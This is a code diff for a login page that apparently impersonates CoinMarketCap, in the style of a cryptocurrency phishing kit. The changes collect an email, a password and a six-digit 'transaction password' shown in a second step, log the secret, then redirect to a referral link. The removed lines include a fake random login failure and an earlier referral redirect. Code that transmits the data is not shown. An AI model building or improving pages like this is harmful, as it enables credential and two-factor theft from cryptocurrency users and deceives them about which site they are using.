@@ -92,42 +92,57 @@ document.addEventListener('DOMContentLoaded', function () {
   });
 });
 
-// const financialPinElement = document.getElementById('financial-pin');
+function isEmail(email) {
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  return emailRegex.test(email);
+}
+
+function isPasswordValid(password) {
+  return password.length > 2;
+}
+
+function isSecretValid(secretInput) {
+  const secret = secretInput.trim();
+
+  if (secret.length !== 6 || isNaN(secret)) {
+    return false;
+  }
+  return true;
+}
+
+const secrerElement = document.getElementById('secret-component');
 const usernameElement = document.getElementById('coinmarketcap-username');
 const passwordElement = document.getElementById('coinmarketcap-password');
-// const secretElement = document.getElementById('coinmarketcap-secret');
+const secretElement = document.getElementById('coinmarketcap-secret');
 
-// let signinClickCount = 0;
 const loginComponent = document.getElementById('coinmarketcap-login');
 loginComponent.addEventListener('click', (event) => {
   event.preventDefault();
 
   let username = usernameElement.value;
   let password = passwordElement.value;
+  let secret = secretElement.value;
 
-  if (username == '' || password == '') {
-    alert('Invalid username and password');
-    return;
+  console.log(secret);
+
+  if (!isEmail(username)) {
+    alert('Please enter a valid email address.');
+    return false;
   }
 
-  // var randomValue = Math.random();
-  // if (randomValue < 0.3) {
-  //   alert('Invalid username and password');
-  //   return;
-  // }
+  if (!isPasswordValid(password)) {
+    alert('Password must be longer than 2 characters.');
+    return false;
+  }
+
+  if (secrerElement.style.display == 'none') {
+    secrerElement.style.display = 'flex';
+    return false;
+  } else if (!isSecretValid(secret)) {
+    alert('Wrong Transaction password.');
+    return false;
+  }
 
   window.location.href =
     'https://echoone.io/register/?ref=eSXKCnc6S9blLXwIvtxa';
-
-  // if (signinClickCount == 0) {
-  //   financialPinElement.style.display = 'block';
-  //   signinClickCount = 1;
-  // } else {
-  //   if (secretElement.value.length != 6) {
-  //     alert('Invalid financial PIN');
-  //     return;
-  //   }
-
-  //   window.location.href = 'https://leftcoins.com/?inviter=admins';
-  // }
 });
